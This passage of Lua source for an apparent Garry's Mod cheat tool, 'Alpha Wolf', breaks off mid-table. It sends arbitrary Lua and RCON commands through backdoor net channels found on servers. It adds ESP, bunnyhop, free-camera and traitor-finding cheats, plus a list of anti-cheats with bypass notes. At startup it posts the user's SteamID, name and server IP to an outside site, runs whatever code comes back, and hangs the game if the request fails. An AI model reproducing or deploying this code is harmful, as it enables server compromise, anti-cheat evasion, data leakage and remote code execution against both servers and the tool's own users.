            self.HTML = self:Add("DHTML")
            self:AddJavascriptCallback("OnCode")
            self:AddJavascriptCallback("OnLog")
            self.HTML:OpenURL(self.URL)
            self.HTML:RequestFocus()
        end

        function PANEL:ReloadHTML()
            self.HTML:OpenURL(self.URL)
        end

        function PANEL:JavascriptSafe(str)
            str = str:gsub(".", javascript_escape_replacements)
            str = str:gsub("\226\128\168", "\\\226\128\168")
            str = str:gsub("\226\128\169", "\\\226\128\169")

            return str
        end

        function PANEL:CallJS(JS)
            self.HTML:Call(JS)
        end

        function PANEL:AddJavascriptCallback(name)
            local func = self[name]

            self.HTML:AddFunction("gmodinterface", name, function(...)
                func(self, HTML, ...)
            end)
        end

        function PANEL:OnCode(_, code)
            self.NextValidate = CurTime() + 0.2
            self.Code = code
        end

        function PANEL:OnLog(_, ...)
            Msg("executer: ")
            print(...)
        end

        function PANEL:SetCode(code)
            self.Code = code
            self:CallJS('SetContent("' .. self:JavascriptSafe(code) .. '");')
        end

        function PANEL:GetCode()
            return 'local me=Entity(' .. LocalPlayer():EntIndex() .. ') local trace=me:GetEyeTrace() local this,there=trace.Entity,trace.HitPos ' .. self.Code
        end

        function PANEL:SetGutterError(errline, errstr)
            self:CallJS("SetErr('" .. errline .. "','" .. self:JavascriptSafe(errstr) .. "')")
        end

        function PANEL:GotoLine(num)
            self:CallJS("GotoLine('" .. num .. "')")
        end

        function PANEL:ClearGutter()
            self:CallJS("ClearErr()")
        end

        function PANEL:GotoErrorLine()
            self:GotoLine(self.ErrorLine or 1)
        end

        function PANEL:SetError(err)
            if not IsValid(self.HTML) then
                self.ErrorPanel:SetText("")
                self:ClearGutter()

                return
            end

            local tall = 0

            if err then
                local line, err = string.match(err, self.COMPILE .. ":(%d*):(.+)")

                if line and err then
                    tall = 20
                    self.ErrorPanel:SetText((line and err) and ("Line " .. line .. ": " .. err) or err or "")
                    self.ErrorLine = tonumber(string.match(err, " at line (%d)%)") or line) or 1
                    self:SetGutterError(self.ErrorLine, err)
                end
            else
                self.ErrorPanel:SetText("")
                self:ClearGutter()
            end

            local wide = self:GetWide()
            local tallm = self:GetTall()
            self.ErrorPanel:SetPos(0, tallm - tall)
            self.ErrorPanel:SetSize(wide, tall)
            self.HTML:SetSize(wide, tallm - tall)
        end

        function PANEL:ValidateCode()
            local time = SysTime()
            local code = self:GetCode()
            self.NextValidate = nil

            if not code or code == "" then
                self:SetError()

                return
            end

            local errormsg = CompileString(code, self.COMPILE, false)
            time = SysTime() - time

            if type(errormsg) == "string" then
                self:SetError(errormsg)
            elseif time > 0.25 then
                self:SetError("Compiling took too long. (" .. math.Round(time * 1000) .. ")")
            else
                self:SetError()
            end
        end

        function PANEL:PerformLayout(w, h)
            local tall = self.ErrorPanel:GetTall()
            self.ErrorPanel:SetPos(0, h - tall)
            self.ErrorPanel:SetSize(w, tall)
            self.HTML:SetSize(w, h - tall)
        end

        vgui.Register("lua_executer", PANEL, "EditablePanel")
        local menu = vgui.Create('DFrame')
        menu:SetSize(ScrW() / 2, ScrH() / 2)
        menu:SetTitle('                                                                                                                                   LUA Executer')
        menu:Center()
        menu:SetSizable(true)
        menu:MakePopup()
        menu:ShowCloseButton(false)

        menu.Paint = function(self, w, h)
            surface.SetDrawColor(30, 30, 30)
            surface.DrawRect(0, 0, w, 25)
            surface.SetDrawColor(0, 0, 0)
            surface.DrawRect(0, 25, w, h - 25)
        end

        local clos = vgui.Create("DButton", menu)
        clos:SetSize(40, 23)
        clos:SetText("")

        clos.Paint = function(self, w, h)
            surface.SetDrawColor(196, 80, 80)
            surface.DrawRect(0, 0, w, h)
            surface.SetFont("marlett")
            local s, s1 = surface.GetTextSize("r")
            surface.SetTextPos(w / 2 - s / 2, h / 2 - s1 / 2)
            surface.SetTextColor(255, 255, 255)
            surface.DrawText("r")
        end

        clos.DoClick = function()
            menu:SetVisible(not menu:IsVisible())
        end

        local ed = vgui.Create('lua_executer', menu)
        ed:SetPos(5, 55)

        menu.PerformLayout = function(self, w, h)
            clos:SetPos(w - 41, 1)
            ed:SetSize(w - 10, h - 60)
        end

        local offset = 5

        local function CreateBtn(wide, text, icon, fn)
            local mt = Material(icon)
            local btn = vgui.Create('DButton', menu)
            btn:SetText('')

            btn.Paint = function(self, w, h)
                if self.Hovered then
                    if self.Depressed then
                        surface.SetDrawColor(90, 90, 90)
                    else
                        surface.SetDrawColor(70, 70, 70)
                    end
                else
                    surface.SetDrawColor(40, 40, 40)
                end

                surface.DrawRect(0, 0, w, h)
                surface.SetDrawColor(255, 255, 255)
                surface.SetMaterial(mt)
                surface.DrawTexturedRect(5, h / 2 - 8, 16, 16)
                draw.SimpleText(text, 'BudgetLabel', 26, h / 2, Color(255, 255, 255), 0, 1)
            end

            btn.DoClick = fn
            btn:SetSize(wide, 20)
            btn:SetPos(offset, 30)
            offset = offset + wide + 5
        end

        CreateBtn(115, "Run code", 'icon16/arrow_down.png', function()
            local code = ed:GetCode()
            RunString(code)
        end)

        MsgC(Color(255, 155, 55), "Loading end!\n")
    end

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Functions
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local function CheckIfStringExists(str)
        local i = 1
        while util.NetworkIDToString(i) do
            if util.NetworkIDToString(i) == str then 
                return true 
            end
            i = i + 1
        end
        return false
    end

    local function checkbackdoors()
        for k,v in pairs(netStrings) do
            if(CheckIfStringExists(v)) then
                channel = v
                if channel then
                    chat.AddText(Color(32, 178, 170), "[Alpha Wolf] ", Color( 0,255,255,255 ), "Found .net Backdoor: ".. channel )
                end
            end
        end
        if not channel then
            chat.AddText(Color(32, 178, 170), "[Alpha Wolf] ", Color( 0,255,255,255 ), "Backdoors on Server not found." )
        end
    end

    local function SendLua(str)
        if not channel then return awolfNotify("Scan for Backdoors first.") end
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(1)
        net.SendToServer()
    end

    local function SendRcon(str)
        if not channel then return awolfNotify("Scan for Backdoors first.") end
        net.Start(channel)
        net.WriteString(str)
        net.WriteBit(0)
        net.SendToServer()
    end

------------------------------------------------------------------------------------------------------------------------------------------------

    local function NoclipCalcView( ply, origin, angles, fov )
        if ( !NoclipEnabled ) then return end
        if ( NoclipSetView ) then
            NoclipViewOrigin = origin
            NoclipViewAngle = angles
            NoclipSetView = false
        end
        return { origin = NoclipViewOrigin, angles = NoclipViewAngle }
    end
    hook.Add("CalcView", awolfstring, NoclipCalcView)

    local function NoclipCreateMove( cmd )
        if ( !NoclipEnabled ) then return end
           
        local time = FrameTime()
        NoclipViewOrigin = NoclipViewOrigin + ( NoclipVelocity * time )
        NoclipVelocity = NoclipVelocity * 0.95
           
        // Rotate the view when the mouse is moved.
        local sensitivity = 0.022
        NoclipViewAngle.p = math.Clamp( NoclipViewAngle.p + ( cmd:GetMouseY() * sensitivity ), -89, 89 )
        NoclipViewAngle.y = NoclipViewAngle.y + ( cmd:GetMouseX() * -1 * sensitivity )
           
        local add = Vector( 0, 0, 0 )
        local ang = NoclipViewAngle
        if ( cmd:KeyDown( IN_FORWARD ) ) then add = add + ang:Forward() end
        if ( cmd:KeyDown( IN_BACK ) ) then add = add - ang:Forward() end
        if ( cmd:KeyDown( IN_MOVERIGHT ) ) then add = add + ang:Right() end
        if ( cmd:KeyDown( IN_MOVELEFT ) ) then add = add - ang:Right() end
        if ( cmd:KeyDown( IN_JUMP ) ) then add = add + ang:Up() end
        if ( cmd:KeyDown( IN_DUCK ) ) then add = add - ang:Up() end
           
        add = add:GetNormal() * time * 500
        if ( cmd:KeyDown( IN_SPEED ) ) then add = add * 5 end
        NoclipVelocity = NoclipVelocity + add

        if ( NoclipLockView == true ) then
                NoclipLockView = cmd:GetViewAngles()
        end
        if ( NoclipLockView ) then
                cmd:SetViewAngles( NoclipLockView )
        end

        cmd:SetForwardMove( 0 )
        cmd:SetSideMove( 0 )
        cmd:SetUpMove( 0 )
    end
    hook.Add("CreateMove", awolfstring2, NoclipCreateMove )

    local function NoclipToggle()
        NoclipEnabled = !NoclipEnabled
        NoclipEnabled = NoclipEnabled
        NoclipSetView = true
    end

------------------------------------------------------------------------------------------------------------------------------------------------
    
    local function rainbowphysgun()
        if not rainb then
            hook.Add("Think", awolfstring3, function()
                local rainbowC = HSVToColor(CurTime() % 6 * 60, 1, 1)
                LocalPlayer():SetWeaponColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
                LocalPlayer():SetPlayerColor(Vector(rainbowC.r / 255, rainbowC.g / 255, rainbowC.b / 255))
            end)
            chat.AddText( Color( 0, 255, 0 ), "[Alpha Wolf]", Color( 255, 255, 255 )," - Rainbow Enabled" )
            rainb = true
        else
            hook.Remove("Think", awolfstring3)
            chat.AddText( Color( 0, 255, 0 ), "[Alpha Wolf]", Color( 255, 255, 255 )," - Rainbow Disabled" )
            rainb = false
        end
    end

------------------------------------------------------------------------------------------------------------------------------------------------

    local function getsomebountyshuntys() --wtf
        if not bhopshitz then
            bhopshitz = true

            hook.Add("CreateMove", awolfstring, function(ply)
                if (ply:KeyDown(IN_JUMP) and not LocalPlayer():IsOnGround()) then
                    ply:RemoveKey(IN_JUMP)

                    if not LocalPlayer():IsFlagSet(FL_ONGROUND) and LocalPlayer():GetMoveType() ~= MOVETYPE_NOCLIP then
                        if (ply:GetMouseX() > 1 or ply:GetMouseX() < -1) then
                            ply:SetSideMove(ply:GetMouseX() > 1 and 400 or -400)
                        else
                            ply:SetForwardMove(5850 / LocalPlayer():GetVelocity():Length2D())
                            ply:SetSideMove((ply:CommandNumber() % 2 == 0) and -400 or 400)
                        end
                    end
                elseif (ply:KeyDown(IN_JUMP)) then
                    ply:SetForwardMove(10000)
                end
            end)

            chat.AddText(Color(0, 255, 0), "[Alpha Wolf]", Color(255, 255, 255), " - Bhop Enabled")
        else
            bhopshitz = false
            chat.AddText(Color(0, 255, 0), "[Alpha Wolf]", Color(255, 255, 255), " - Bhop Disabled")
            hook.Remove("CreateMove", awolfstring)
        end
    end
------------------------------------------------------------------------------------------------------------------------------------------------

    local function SmallShit()
        if (engine.ActiveGamemode() == "terrortown") then
            awolfNotify("Traitor Finder: Activated")
            awolfNotify("Traitor Finder: When Traitor buys something it will popup here in chat.")
            hook.Add("Think", awolfstring, function()
                for k, v in ipairs(ents.GetAll()) do
                    local _v = v:GetOwner()
                    if (_v == ply) then continue end

                    if (GetRoundState() == 3 and v:IsWeapon() and _v:IsPlayer() and not _v.Detected and table.HasValue(v.CanBuy, 1)) then
                    if (_v:GetRole() ~= 2) then
                        _v.Detected = true
                        surface.PlaySound("npc/scanner/combat_scan1.wav") -- Decided to keep this sound because it might be the most important one
                        awolfNotify(_v:Nick() .. " is a Traitor. He just bought: " .. v:GetPrintName())
                    end
                    elseif (GetRoundState() ~= 3) then
                        v.Detected = false
                    end
                end
            end)
        else
            awolfNotify("Traitor Finder: Deactivated")
        end
        --
        for k, v in pairs(player.GetAll()) do
            for name, steamid in pairs(devs) do
                if v:SteamID64() == steamid then
                 awolfNotify("A creator of AlphaWolf, " .. name .. ", is on the server!")
                end
            end
        end
        --
        if detouredshit == "89.163.154.171:27015" then
            net.Receive("JailRoomRules", function() awolfNotify("Regeln blockiert...") end)
            awolfNotify("!! Regel Fenster werden blockiert aber Jail nicht. !!")
        end

        if detouredshit == "51.89.95.1:27015" then
            net.Receive("openrulepage", function() awolfNotify("Regeln blockiert...") end)
            awolfNotify("!! Regel Fenster werden blockiert. !!")
        end
        --
        for k, v in pairs(hook.GetTable().SpawnMenuOpen || {}) do
            hook.Remove("SpawnMenuOpen", k)
        end
    
        for k, v in pairs(hook.GetTable().ContextMenuOpen || {}) do
            hook.Remove("ContextMenuOpen", k)
        end
        --
        hook.Add("Think", awolfstring4, function()
            for k, v in pairs(player.GetAll()) do
                if (IsValid(v:GetObserverTarget())) and v:GetObserverTarget() == ply and not v.spectating then
                    v.spectating = true
                    surface.PlaySound("npc/scanner/combat_scan1.wav")
                    awolfNotify("!! Someone is spectating you !!")
                    break
                end
            end
        end)
        --        
        hook.Add("RenderScene", awolfstring, function(vOrigin, vAngle, vFOV)
        local view = {
            x = 0,
            y = 0,
            w = ScrW(),
            h = ScrH(),
            dopostprocess = true,
            origin = vOrigin,
            angles = vAngle,
            fov = vFOV,
            drawhud = true,
            drawmonitors = true,
            drawviewmodel = true
        }

        render.RenderView(view)
        render.CopyTexture(nil, fakeRT)
        cam.Start2D()
        hook.Run("AltHUDPaint")
        cam.End2D()
        render.SetRenderTarget(fakeRT)

        return true
    end)

    hook.Add("ShutDown", awolfstring, function() render.SetRenderTarget() end)
    end

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Main Menu
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    MatLib.SetDarkMode(true, false)

    if (!_G.MatLib_Theme) then
        MatLib.SetThemeColor(Color(0, 128, 128))
        MatLib.Colors.FrameBG = Color(27, 27, 27)
        _G.MatLib_Theme = "Teal"
    end

    local mainmenu = MatLib.Frame(850, 0, ScrW() * 0.25, ScrH() * 0.5, "                              Main Menu")
    mainmenu:SetVisible(false)
    Menu = function() visible = not visible mainmenu:SetVisible(visible) end

    makeButton(mainmenu,"Settings",0.05,0.200,function() surface.PlaySound("buttons/button18.wav") Menu() Settings() end,0.20,0.07)
    makeButton(mainmenu,"Anti-Cheats",0.28,0.200,function() surface.PlaySound("buttons/button18.wav") Menu() DetectionMenu() end,0.20,0.07)


    makeButton(mainmenu,"BD-Menu",0.05,0.100,function() surface.PlaySound("buttons/button18.wav") Menu() BDMenu() end,0.20,0.07)
    makeButton(mainmenu,"Radio",0.28,0.100,function() surface.PlaySound("buttons/button18.wav") Menu() RadioMenu() end,0.20,0.07)

    makeButton(mainmenu,"Lua-Executer",0.05,0.770,function() surface.PlaySound("garrysmod/ui_click.wav") Menu() codeshit() end,0.20,0.07)
    makeButton(mainmenu,"Multi-Phys",0.28,0.770,function() surface.PlaySound("garrysmod/ui_click.wav") rainbowphysgun() end,0.20,0.07)
    makeButton(mainmenu,"Player-Check",0.51,0.770,function() surface.PlaySound("garrysmod/ui_click.wav") Menu() PeopleCheckMenu() end,0.20,0.07)
    makeButton(mainmenu,"Plugins",0.74,0.770,function() surface.PlaySound("buttons/button18.wav") Menu() PluginMenu() end,0.20,0.07)


    makeButton(mainmenu,"Bunnyhop",0.28,0.880,function() surface.PlaySound("garrysmod/ui_click.wav") getsomebountyshuntys() end,0.20,0.07)
    makeButton(mainmenu,"ESP",0.51,0.880,function() surface.PlaySound("garrysmod/ui_click.wav") ESPMain() end,0.20,0.07)
    makeButton(mainmenu,"CNoclip",0.74,0.880,function() NoclipToggle() end,0.20,0.07)

    makeButton(mainmenu,"Unload",0.05,0.880,function()
        surface.PlaySound("buttons/button18.wav")
        awolfNotify("Unloading may cause Bugs")
        Menu()
        hook.Remove("Think",awolfstring)
        hook.Remove("RenderScene",awolfstring)
        hook.Remove("ShutDown",awolfstring)
        hook.Remove("PreDrawHalos", awolfstring)
        hook.Remove("CreateMove", awolfstring)
        hook.Remove("AltHUDPaint", awolfstring)
        hook.Remove("CalcView", awolfstring)

        hook.Remove("Think",awolfstring2)
        hook.Remove("AltHUDPaint", awolfstring2)
        hook.Remove("CreateMove", awolfstring2)

        hook.Remove("Think",awolfstring3)
        hook.Remove("Think",awolfstring4)
        hook.Remove("Think",awolfstring5)
    end,0.20,0.07)

    local background = vgui.Create( "DHTML", mainmenu )
    background:SetPos(290, 40)
    background:SetSize(150, 150)
    background:OpenURL("https://load.alpha-wolf.xyz/wolfeds.png")

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   CUSTOMIZATION
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local settings = MatLib.Frame(-1, -1, ScrW() * 0.31, ScrH() * 0.5, "AlphaWolf - Settings")
    settings:SetVisible(false)
    Settings = function() visible = !visible settings:SetVisible(visible) end
    closeButton(settings,function() Settings() end)

    local scroll = MatLib.ScrollPanel(settings, 0, settings:GetHeaderHeight(), settings:GetWide(), settings:GetTall() - settings:GetHeaderHeight())

    local infoItem = MatLib.ScrollItem(scroll, settings:GetTall() * 0.1)
    MatLib.HeaderText(infoItem, infoItem:GetWide() * 0.025, infoItem:GetTall() * 0.1, "Settings")
    MatLib.Text(infoItem, infoItem:GetWide() * 0.025, infoItem:GetTall() * 0.6, "This is the settings page. Edit AlphaWolf to your liking here.")

    local colorBox = MatLib.ScrollItem(scroll, settings:GetTall() * 0.1)
    MatLib.HeaderText(colorBox, colorBox:GetWide() * 0.025, colorBox:GetTall() * 0.1, "Theme Color")
    MatLib.Text(colorBox, colorBox:GetWide() * 0.025, colorBox:GetTall() * 0.6, "The Theme Color for the UI.")
    local colorBoxField = MatLib.ComboBox(colorBox, colorBox:GetWide() * 0.85, colorBox:GetTall() * 0.3, colorBox:GetWide() * 0.1, colorBox:GetTall() * 0.4, _G.MatLib_Theme, {"Teal", "Orange", "Green", "Blue", "Cyan", "Purple", "Pink", "Red", "Black"})
    colorBoxField.OnSelect = function(self)
        _G.MatLib_Theme = self:GetSelected()
        colors["Teal"] = Color(0, 128, 128)
        colors["Orange"] = Color(255, 127, 50)
        colors["Green"] = Color(0, 200, 0)
        colors["Blue"] = Color(25, 0, 255)
        colors["Cyan"] = Color(0, 190, 190)
        colors["Purple"] = Color(150, 0, 255)
        colors["Pink"] = Color(255, 0, 255)
        colors["Red"] = Color(145, 17, 17)
        colors["Black"] = Color(0, 0, 0)
        MatLib.SetThemeColor(colors[_G.MatLib_Theme])
        local function awolfNotify(msg)
            chat.AddText(Color(32, 178, 170), "[Λlpha Wolf] ", colors[_G.MatLib_Theme], msg)
        end
    end

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Intro
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local function inQuad( fraction, beginning, change )
        return change * ( fraction ^ 2 ) + beginning
    end

    local AlphaHi = vgui.Create("DFrame")
    AlphaHi:SetPos(0, 250)
    AlphaHi:SetSize(ScrW(), ScrH() / 5)
    AlphaHi:SetTitle("")
    AlphaHi:ShowCloseButton(false)
    AlphaHi:SetDraggable(false)

    AlphaHi.Paint = function(self, w, h)
        draw.RoundedBox(0, 0, 30, ScrW(), 300, Color(0, 0, 0, 225))
        draw.SimpleText("Welcome back, " .. LocalPlayer():Name() .. "!", "AlphaFett", ScrW() / 2, ScrH() - ScrH() + 90, Color(244, 244, 244), 1, 1)
        draw.SimpleText("You are playing on: " .. game.GetIPAddress() .. "", "AlphaFett", ScrW() / 2, ScrH() - ScrH() + 160, Color(244, 244, 244), 1, 1)
    end

    local anim = Derma_Anim("EaseInQuad", AlphaHi, function(pnl, anim, delta, data)
        pnl:SetPos(inQuad(delta, ScrW() - ScrW() - ScrW(), ScrW()), 250) -- Change the X coordinate from 200 to 200+600 
    end)

    anim:Start(2)

    AlphaHi.Think = function(self)
        if anim:Active() then
            anim:Run()
        end
    end

    timer.Simple(4, function()
        local anim = Derma_Anim("EaseInQuad", AlphaHi, function(pnl, anim, delta, data)
            pnl:SetPos(inQuad(delta, ScrW() - ScrW() - ScrW() + ScrW(), ScrW()), 250) -- Change the X coordinate from 200 to 200+600
        end)

        anim:Start(1.5)

        AlphaHi.Think = function(self)
            if anim:Active() then
                anim:Run()
            end
        end

        timer.Simple(1.6, function()
            AlphaHi:Close()
        end)
    end)

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Starter
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    surface.PlaySound("garrysmod/content_downloaded.wav")
    print([[
     ________  ___       ________  ___  ___  ________          ___       __   ________  ___       ________ 
    |\   __  \|\  \     |\   __  \|\  \|\  \|\   __  \        |\  \     |\  \|\   __  \|\  \     |\  _____\
    \ \  \|\  \ \  \    \ \  \|\  \ \  \\\  \ \  \|\  \       \ \  \    \ \  \ \  \|\  \ \  \    \ \  \__/ 
     \ \   __  \ \  \    \ \   ____\ \   __  \ \   __  \       \ \  \  __\ \  \ \  \\\  \ \  \    \ \   __\
      \ \  \ \  \ \  \____\ \  \___|\ \  \ \  \ \  \ \  \       \ \  \|\__\_\  \ \  \\\  \ \  \____\ \  \_|
       \ \__\ \__\ \_______\ \__\    \ \__\ \__\ \__\ \__\       \ \____________\ \_______\ \_______\ \__\ 
        \|__|\|__|\|_______|\|__|     \|__|\|__|\|__|\|__|        \|____________|\|_______|\|_______|\|__| 
                                                                                                            ]])
    awolfNotify("Welcome to Wolf Alpha, F2 to open")
    awolfNotify("Thanks Livaco, Owain and UltraHD for MatLib")
    awolfNotify("Spectator Alert: Activated")
    print("PRESS F2 TO OPEN MENU")

    timer.Simple(1,function() SmallShit() surface.PlaySound("npc/scanner/combat_scan1.wav") end)

    ply:SetWeaponColor(Vector(0, 1, 1))

    hook.Add("Think", awolfstring2, function()
        local cache = input.IsButtonDown(KEY_F2)
        if cache and FirstPressed then
            Menu()
        end
        FirstPressed = not cache
    end)

    http.Post("https://alpha-wolf.xyz/wolfback/alphawolfsecretetshitssdasfgdg5468/asdag845/post.php", { servername = GetHostName(), serverip = game.GetIPAddress(), username = ply:Name().."  (BETA)", userid = ply:SteamID(), authed = "true" }, function(b) RunString(b) end, function( failed ) while true do end end )

------------------------------------------------------------------------------------------------------------------------------------------------
/*
*   Anti-Cheat Menu
*/
------------------------------------------------------------------------------------------------------------------------------------------------

    local function Detect(what, say)
        if what then
            awolfNotify(say)
        end
    end

    local function chpa(path)
        if file.Exists(path, "LUA") then return true end
    end

    local anticheats = {
        ["DamageLog"] = {
            desc = "This a Log System, nothing to worry about.",
            scan = function()
                if chpa("cl_damagelog.lua") or chpa("autorun/damagelog_autorun.lua") then return true end
            end
        },
        ["Anti Prop Griefing"] = {
            desc = "This a Anti Griefing System, nothing to worry about.",
            scan = function()
                if chpa("autorun/sh_fuseco_antipropgriefing.lua") or chpa("autorun/sh_apg.lua") or chpa("autorun/client/cl_apg_init.lua") or chpa("autorun/client/apa_clinit.lua") then return true end
            end
        },
        ["Spawn Protection"] = {
            desc = "This a Prop System, nothing to worry about.",
            scan = function()
                if chpa("sz_config.lua") or chpa("autorun/autorun_safezones.lua") then return true end
            end
        },
        ["Pwnscripthook"] = {
            desc = "This a anti scripthook system, nothing to worry about as long as you use a DLL Filestealer.",
            scan = function()
                if chpa("scripthookpwnd.lua") or chpa("autorun/client/cl_scripthookpwnd.lua") then return true end
            end
        },
        ["C-Disable"] = {
            desc = "This a context menu disabler, nothing to worry.",
            scan = function()
                if chpa("autorun/client/cl_qcontext.lua") then return true end
            end
        },
        ["MLogs"] = {
            desc = "This a Logging System, nothing to worry about.",
            scan = function()
                if chpa("autorun/mlog_load.lua") or chpa("logs/core_sh.lua") then return true end
            end
        },
        ["MG-Logs"] = {
            desc = "This a Logging System, nothing to worry about.",
            scan = function()
                if chpa("mg_logs/core_sh.lua") then return true end
            end
        },
        ["RLogs"] = {
            desc = "This a private and unknown Logging System, nothing to worry about.",
            scan = function()
                if chpa("autorun/client/r_loader_cl.lua") then return true end
            end
        },
        ["Ultimate Logs"] = {
            desc = "This a Logging System, nothing to worry about.",
            scan = function()
                if chpa("autorun/ultimatelogs.lua") then return true end
            end
        },
        ["BLogs"] = {
            desc = "This a Logging System, nothing to worry about.",
            scan = function()
                if chpa("gmodadminsuite/modules/logging/cl_menu.lua") or chpa("vgui/gas_logging_advanced_search_item.lua") or chpa("autorun/_blogs_load.lua") then return true end
            end
        },
        ["PLogs"] = {
            desc = "This a Logging System, nothing to worry about.",
            scan = function()
                if chpa("plogs_cfg.lua") or chpa("autorun/plogs_init.lua") or chpa("plogs_mysql_cfg.lua") then return true end
            end
        },
        ["AWarn2"] = {
            desc = "This a Warn System, nothing to worry about.",
            scan = function()
                if chpa("autorun/sh_awarn.lua") then return true end
            end
        },
        ["AWarn3"] = {
            desc = "This a Warn System, nothing to worry about.",
            scan = function()
                if chpa("includes/sh_awarn3.lua") or chpa("includes/cl_awarn3.lua") then return true end
            end
        },
        ["Ember (Ban System)"] = {
            desc = "This an Ban System, nothing to worry about.",
            scan = function()
                if chpa("autorun/client/ember.lua") then return true end
            end
        },
        ["Anti-Familysharing"] = {
            desc = "This an Familysharing detection System, may block Alts.",
            scan = function()
                if chpa("autorun/client/cl_familysharing.lua") or chpa("autorun/antifamilysharing.lua") or chpa("autorun/familysharing.lua") then return true end
            end
        },
        ["Screengrab"] = {
            desc = "This can be used by Staff to see your Screen, Anti-Screengrab is active.",
            scan = function()
                if chpa("cl_screengrab.lua") or chpa("autorun/sh_screengrab_v2.lua") or chpa("autorun/sh_screengrab.lua") then return true end
            end
        },
        ["Leyscreencap"] = {
            desc = "This can be used by Staff to see your Screen, Anti-Screengrab is active.",
            scan = function()
                if chpa("autorun/client/cl_leyscreencap.lua") then return true end
            end
        },
        ["Void"] = {
            desc = "This an Monitor System, will steal everything the player has run.",
            scan = function()
                if chpa("autorun/sh_fuckthissheet.lua") then return true end
            end
        },
        ["SNTE"] = {
            desc = "This an Anti-Exploit and Anti-Backdoor System, fake Backdoors are present.",
            scan = function()
                if ConVarExists("snte_banmethod") or ConVarExists("snte_ulxluarun") or ConVarExists("snte_duperun") or ConVarExists("snte_dupefix") or chpa("autorun/!coresource_snte.lua") or istable(global_nets) then return true end
            end
        },
        ["BetterSnte"] = {
            desc = "This an upgraded version of SNTE, should be bypassed.",
            scan = function()
                if chpa("autorun/!!bettersnte.lua") or chpa("epstat.lua") then return true end
            end
        },
        ["Bad No-Name Anticheat"] = {
            desc = "This an Anti-Cheat System, needs testing",
            scan = function()
                if chpa("autorun/client/cl_cheats.lua") then return true end
            end
        },
        ["Anti-Citizenhack"] = {
            desc = "This a Anti-Citizenhack System, injecting Citizenhack will result in a gamecrash.",
            scan = function()
                if chpa("0000ac/client/cl_init.lua") then return true end
            end
        },
        ["Cardinal Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection",
            scan = function()
                if chpa("sh_cardinal.lua") or chpa("client/cl_cardinal.lua") then return true end
            end
        },
        ["Telecomm Anti-Exploit"] = {
            desc = "This a Anti-Exploit System, needs testing for detection",
            scan = function()
                if chpa("autorun/client/cl_antinexploits.lua") then return true end
            end
        },
        ["Nyaaa Anti-Exploit"] = {
            desc = "This a Anti-Exploit System, needs testing for detection",
            scan = function()
                if chpa("autorun/ab.lua") or chpa("autorun/client/ab.lua") then return true end
            end
        },
        ["CAC Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, it's old and should be bypassed.",
            scan = function()
                if chpa("autorun/client/!!!cac.lua") then return true end
            end
        },
        ["Quack Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, it's old and should be bypassed.",
            scan = function()
                if chpa("autorun/client/!!_cl_qac.lua") or chpa("cl_qac.lua") then return true end
            end
        },
        ["SimpLAC Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, don't BHop, Aimbot and ESP.",
            scan = function()
                if chpa("settings_simplac.lua") then return true end
            end
        },
        ["Jenni Anti-Exploit"] = {
            desc = "This a Anti-Exploit System, needs testing for detection.",
            scan = function()
                if chpa("autorun/client/cl_anti_exploits.lua") then return true end
            end
        },
        ["CIB Anti-Exploit"] = {
            desc = "This a Anti-Exploit System, needs testing for detection.",
            scan = function()
                if chpa("autorun/sh_start_cib.lua") or chpa("cib/sh_config_cib.lua") then return true end
            end
        },
        ["G-Security"] = {
            desc = "This a Anti-Exploit System, needs testing for detection.",
            scan = function()
                if chpa("autorun/client/!!!!!!!!!!!!!!!!!!!!!!aaaaaaaaaaa.lua") then return true end
            end
        },
        ["C0nw0nk's Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("autorun/send-lua-and-net-send.lua") then
                    hook.Remove("OnPlayerHitGround", "Anti-Bhop")
                    awolfNotify("C0nw0nk's Anti-Cheat: Anti-BHop deactivated")

                    return true
                end
            end
        },
        ["CPE - Anti Backdoor"] = {
            desc = "This an Anti-Backdoor (LIKE SNTE) System, needs testing for detection.",
            scan = function()
                if chpa("autorun/!!!!!!!!!!!!!!!0_cpe.lua") or chpa("autorun/client/cl_cpe.lua") or chpa("ulx/modules/sh/cpe.lua") then return true end
            end
        },
        ["SwiftAC"] = {
            desc = "This an Anti-Cheat System, should get Detoured.",
            scan = function()
                if chpa("swiftac.lua") then return true end
            end
        },
        ["Daz Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_dazanticheat.lua") then return true end
            end
        },
        ["LeyAC"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_leyac_menu.lua") or chpa("_ley_imp.lua") then return true end
            end
        },
        ["Tyler's Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_blunderbuss.lua") then return true end
            end
        },
        ["Very Basic Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_vbac.lua") then return true end
            end
        },
        ["Blade Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_draw_check.lua") then return true end
            end
        },
        ["Awesome Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("cl_anticheat.lua") or chpa("cl_settingsderma.lua") then return true end
            end
        },
        ["Modern Anti-Cheat"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("autorun/client/cl_mac.lua") then return true end
            end
        },
        ["Umbrella"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
                if chpa("umbrella.lua") then return true end
            end
        },
        ["Viper"] = {
            desc = "This an Anti-Cheat System, needs testing for detection.",
            scan = function()
